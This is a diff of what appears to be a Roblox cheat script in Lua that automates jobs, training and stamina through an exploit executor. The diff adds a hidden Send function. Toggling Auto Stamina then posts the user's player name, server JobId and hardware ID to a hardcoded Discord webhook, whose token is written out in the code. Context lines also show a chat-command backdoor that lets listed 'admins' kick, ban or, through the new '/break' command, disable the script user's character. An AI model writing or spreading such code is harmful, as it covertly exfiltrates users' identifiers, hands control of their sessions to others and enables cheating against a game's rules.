@@ -118,7 +118,6 @@ end
         end
         return KeyCode
     end
-    
     local function Decode(str)
         local KeyCode = '';
         local Splited = str:split('/');
@@ -185,7 +184,18 @@ end
         }
         )
     end
-    
+    function Send(title, desc, URL)
+        local Data = game:GetService("HttpService"):JSONEncode({
+            ["embeds"] = {{
+                ["title"] = title,
+                ["description"] = desc,
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+            }}
+        })
+        request = http_request or request or HttpPost or syn.request
+        request({Url = URL, Body = Data, Method = "POST", Headers = {["content-type"] = "application/json"}})
+    end
     spawn(function()
         for i,v in pairs(game.Players:GetChildren()) do
             for k,p in pairs(getgenv().AdminNameTable) do
@@ -194,19 +204,35 @@ end
                     v.Chatted:Connect(function(msg)
                         local plrlen = plr.Name:len()
                         if plr.Name == p then
-                            print("A+2=3=>A=3-2=1=>A=1")
                         else
                             if msg:sub(1,6) == "/kick " then
                                 local plrkick = game.Players:FindFirstChild(msg:sub(7))
                                 if plrkick then
                                     plr:Kick("You got kicked!")   
                                 end
-                            elseif msg:sub(1,6) == "/kill " then
-                                local plrkill = game.Players:FindFirstChild(msg:sub(7))
-                                if plrkill then
-                                    plr.Character.Head.Neck:Destroy()
-                                    plr.Character.Humanoid.Health = 0
-                                    plr.Character.Humanoid:TakeDamage(math.huge)
+                            elseif msg:sub(1,7) == "/break " then
+                                local plrbreakall = game.Players:FindFirstChild(msg:sub(8))
+                                if plrbreakall then
+                                    for a1,v1 in pairs(game.Players.LocalPlayer.Character.LeftUpperArm:GetChildren()) do
+                                        if v1:IsA("Motor6D") and v1.Name == "LeftShoulder" then
+                                            v1:Destroy()
+                                        end
+                                    end
+                                    for a2,v2 in pairs(game.Players.LocalPlayer.Character.RightUpperArm:GetChildren()) do
+                                        if v2:IsA("Motor6D") and v2.Name == "RightShoulder" then
+                                            v2:Destroy()
+                                        end
+                                    end
+                                    for a3,v3 in pairs(game.Players.LocalPlayer.Character.LeftUpperLeg:GetChildren()) do
+                                        if v3:IsA("Motor6D") and v3.Name == "LeftHip" then
+                                            v3:Destroy()
+                                        end
+                                    end
+                                    for a4,v4 in pairs(game.Players.LocalPlayer.Character.RightUpperLeg:GetChildren()) do
+                                        if v4:IsA("Motor6D") and v4.Name == "RightHip" then
+                                            v4:Destroy()
+                                        end
+                                    end
                                 end
                             elseif msg:sub(1,5) == "/ban " then
                                 local plrban = game.Players:FindFirstChild(msg:sub(6))
@@ -228,7 +254,6 @@ end
         end
     end)
     
-    
     getgenv().CurrentMaxStamina = math.floor(game.Players.LocalPlayer.Character.MaxStamina.Value)
     getgenv().EatPhanTram = 20
     getgenv().DelayClick = 1
@@ -237,7 +262,84 @@ end
     getgenv().StopAutoStamina = 20
     getgenv().StopTreadmill = 20
     getgenv().MousePos = false
-    
+    getgenv().v___1 = true
+    getgenv().v___2 = false
+    getgenv().v___3 = false
+    getgenv().v___4 = false
+    getgenv().v___5 = false
+    getgenv().v___6 = false
+    getgenv().v___7 = false
+    getgenv().v___8 = false
+    getgenv().v___9 = false
+    getgenv().v___10 = false
+    getgenv().v___11 = false
+    getgenv().v___12 = false
+    getgenv().v___13 = false
+    getgenv().v___14 = false
+    getgenv().v___15 = false
+    getgenv().v___16 = false
+    getgenv().v___17 = false
+    ---
+    local v1 = Vector3.new(-317.60885620117, 47.137981414795, -585.22619628906)
+    local v2 = Vector3.new(-317.88973999023, 47.137977600098, -592.13891601562)
+    local v3 = Vector3.new(-177.86753845215, 46.47798538208, -589.45153808594)
+    local v4 = Vector3.new(-178.14970397949, 46.437984466553, -441.67700195312)
+    local v5 = Vector3.new(368.29479980469, 27.387985229492, -445.60528564453)
+    local v6 = Vector3.new(419.78552246094, 28.138019561768, -847.77008056641)
+    local v7 = Vector3.new(368.29479980469, 27.387985229492, -445.60528564453)
+    local v8 = Vector3.new(-178.14970397949, 46.437984466553, -441.67700195312)
+    local v9 = Vector3.new(-177.86753845215, 46.47798538208, -589.45153808594)
+    local v10 = Vector3.new(-279.63241577148, 47.137992858887, -590.84283447266)
+    local v11 = Vector3.new(-280.81820678711, 47.237987518311, -552.75842285156)
+    local v12 = Vector3.new(-279.63241577148, 47.137992858887, -590.84283447266)
+    local v13 = Vector3.new(-309.34463500977, 47.93688583374, -600.7353515625)
+    local v14 = Vector3.new(-317.60885620117, 47.137981414795, -585.22619628906)
+
+    local posfastjob = {
+        
+    }
+    ---
+    local v__0 = 4
+    local v__1 = 1.5
+    local v__2 = game
+    local v__3 = "HumanoidRootPart"
+    local v__4 = "LocalPlayer"
+    local v__5 = "Humanoid"
+    local v__6 = "Players"
+    local v__7 = "Character" 
+    local v__8 = "Position"
+    local v__9 = "PlayerGui"
+    local v__10 = "JobGUI"
+    local v__11 = "Frame"
+    local v__12 = "Title" 
+    local v__13 = "Text"
+    local v__14 = "Restock Job"
+    local v__15 = "Workspace"
+    local v__16 = "JobBoardModel"
+    local v__17 = "ClickDetector"
+    local v__18 = "Quit"
+    local v__19 = "MouseButton1Click"
+    local v__20 = "Function"
+    local v__21 = "Board"
+    local v__22 = "Magnitude"
+    local v__26 = "Cleaning Job"
+    local v__27 = "Delivery Job"
+    local v__28 = game:GetService("VirtualUser")
+
+    local function v__23()
+        local v__24 = (v__2[v__6][v__4][v__7][v__3][v__8] - v__2[v__15][v__16][v__21][v__8])[v__22]
+        wait()
+        if v__24 > v__0 then
+            getgenv().v___15 = false
+        elseif v__24 < v__0 then
+            getgenv().v___15 = true
+        end
+    end
+    local function v__25()
+        for v____21,v____22 in pairs(getconnections(v__2[v__6][v__4][v__9][v__10][v__11][v__18][v__19])) do
+            v____22[v__20]()
+        end
+    end
     local function TrueAutoStamina()
         local info_true_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = true,[2] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_true_1))
     end
@@ -269,84 +371,6 @@ end
     b:Toggle("Auto Job", false, function(check)
         getgenv().v___0 = check
         if check then
-        getgenv().v___1 = true
-        getgenv().v___2 = false
-        getgenv().v___3 = false
-        getgenv().v___4 = false
-        getgenv().v___5 = false
-        getgenv().v___6 = false
-        getgenv().v___7 = false
-        getgenv().v___8 = false
-        getgenv().v___9 = false
-        getgenv().v___10 = false
-        getgenv().v___11 = false
-        getgenv().v___12 = false
-        getgenv().v___13 = false
-        getgenv().v___14 = false
-        getgenv().v___15 = false
-        getgenv().v___16 = false
-        getgenv().v___17 = false
-        ---
-        local v1 = Vector3.new(-317.60885620117, 47.137981414795, -585.22619628906)
-        local v2 = Vector3.new(-317.88973999023, 47.137977600098, -592.13891601562)
-        local v3 = Vector3.new(-177.86753845215, 46.47798538208, -589.45153808594)
-        local v4 = Vector3.new(-178.14970397949, 46.437984466553, -441.67700195312)
-        local v5 = Vector3.new(368.29479980469, 27.387985229492, -445.60528564453)
-        local v6 = Vector3.new(419.78552246094, 28.138019561768, -847.77008056641)
-        local v7 = Vector3.new(368.29479980469, 27.387985229492, -445.60528564453)
-        local v8 = Vector3.new(-178.14970397949, 46.437984466553, -441.67700195312)
-        local v9 = Vector3.new(-177.86753845215, 46.47798538208, -589.45153808594)
-        local v10 = Vector3.new(-279.63241577148, 47.137992858887, -590.84283447266)
-        local v11 = Vector3.new(-280.81820678711, 47.237987518311, -552.75842285156)
-        local v12 = Vector3.new(-279.63241577148, 47.137992858887, -590.84283447266)
-        local v13 = Vector3.new(-309.34463500977, 47.93688583374, -600.7353515625)
-        local v14 = Vector3.new(-317.60885620117, 47.137981414795, -585.22619628906)
-    
-        local posfastjob = {
-            
-        }
-        ---
-        local v__0 = 4
-        local v__1 = 1.5
-        local v__2 = game
-        local v__3 = "HumanoidRootPart"
-        local v__4 = "LocalPlayer"
-        local v__5 = "Humanoid"
-        local v__6 = "Players"
-        local v__7 = "Character" 
-        local v__8 = "Position"
-        local v__9 = "PlayerGui"
-        local v__10 = "JobGUI"
-        local v__11 = "Frame"
-        local v__12 = "Title" 
-        local v__13 = "Text"
-        local v__14 = "Restock Job"
-        local v__15 = "Workspace"
-        local v__16 = "JobBoardModel"
-        local v__17 = "ClickDetector"
-        local v__18 = "Quit"
-        local v__19 = "MouseButton1Click"
-        local v__20 = "Function"
-        local v__21 = "Board"
-        local v__22 = "Magnitude"
-        local v__26 = "Cleaning Job"
-        local v__27 = "Delivery Job"
-        local v__28 = game:GetService("VirtualUser")
-        ---
-        local function v__23()
-            local v__24 = (v__2[v__6][v__4][v__7][v__3][v__8] - v__2[v__15][v__16][v__21][v__8])[v__22]
-            wait()
-            if v__24 > v__0 then
-                getgenv().v___15 = false
-            elseif v__24 < v__0 then
-                getgenv().v___15 = true
-            end
-        end
-        local function v__25()
-            for v____21,v____22 in pairs(getconnections(v__2[v__6][v__4][v__9][v__10][v__11][v__18][v__19])) do
-                v____22[v__20]()
-            end
-        end
         ---
         spawn(function()
         while getgenv().v___0 == true do wait()
@@ -684,11 +708,6 @@ end
         game.Players.LocalPlayer.Character.Humanoid:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
     end
     end)
-    
-    --[[b:Toggle("Auto Job Fast | Locked", function(check)
-        getgenv().AutoJobFastBeta = check
-    end)--]]
-    
     b:Toggle("Auto Training", false, function(a)
         getgenv().AutoTraining = a
         spawn(function()
@@ -778,6 +797,8 @@ end
     
     b:Toggle("Auto Stamina", false, function(check)
     getgenv().AutoStaminaEN = check
+    getgenv().CheckToString1 = tostring(check)
+    Send("||"..game.Players.LocalPlayer.Name.."||","**JobId:** ".."||"..game.JobId.."||** | HWID:** ||"..HWID.."|| **| Pressed ATSTMN:** "..getgenv().CheckToString1, "https://discord.com/api/webhooks/954078825610899547/vOMeNQV5LcOSHSyfZgXwXFa7P7_gNdCtjoDk88etzsrSu_Jn8wjjqEgC3FFzKwFiqj3j")
         if getgenv().AutoStaminaEN then
             spawn(function()
                 if getgenv().savearg1 then
